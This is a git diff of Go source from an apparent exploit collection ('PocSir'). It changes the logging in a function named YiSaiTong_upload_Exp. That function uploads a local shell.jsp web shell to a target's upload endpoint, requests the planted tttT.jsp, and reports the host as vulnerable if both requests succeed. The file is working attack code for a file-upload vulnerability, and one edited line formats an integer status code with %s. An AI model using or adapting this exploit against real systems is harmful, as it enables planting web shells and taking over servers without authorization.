@@ -1,11 +1,11 @@
 package poc
 
 import (
+	"PocSir/config"
 	"bytes"
 	"crypto/tls"
 	"github.com/fatih/color"
 	"io/ioutil"
-	"log"
 	"math/rand"
 	"net/http"
 	"time"
@@ -49,7 +49,7 @@ func YiSaiTong_upload_Exp(target string) {
 
 	shell, err := ioutil.ReadFile("shell.jsp")
 	if err != nil {
-		log.Println("[-]打开文件失败")
+		config.ErrMsg.Println("[-]打开文件失败")
 		return
 	}
 	req, err := http.NewRequest("POST", payloadUrl, bytes.NewBuffer(shell))
@@ -61,24 +61,24 @@ func YiSaiTong_upload_Exp(target string) {
 
 	resp, err := client.Do(req)
 	if err != nil {
-		log.Println("[-]", err)
+		config.ErrMsg.Println("[-]", err)
 		return
 	}
 	defer resp.Body.Close()
 	req1, err := http.NewRequest("GET", target+"/tttT.jsp", nil)
 	if err != nil {
-		log.Println("[-]目标访问失败")
+		config.ErrMsg.Println("[-]目标访问失败")
 		return
 	}
 	req1.Header.Add("User-Agent", getRandUa())
 	resp2, err := client.Do(req1)
 	if err != nil {
-		log.Println("[-]", err)
+		config.ErrMsg.Println("[-]", err)
 		return
 	}
 	if resp.StatusCode == http.StatusOK && resp2.StatusCode == http.StatusOK {
-		color.Green("[+]存在漏洞,地址%s\n", target+"/tttT.jsp")
+		config.Right.Printf("[+]存在漏洞,地址%s\n", target+"/tttT.jsp")
 	} else {
-		color.Red("[-]不存在漏洞,目标:", resp2.StatusCode)
+		config.ErrMsg.Printf("[-]不存在漏洞,目标:%s\n", resp2.StatusCode)
 	}
 }
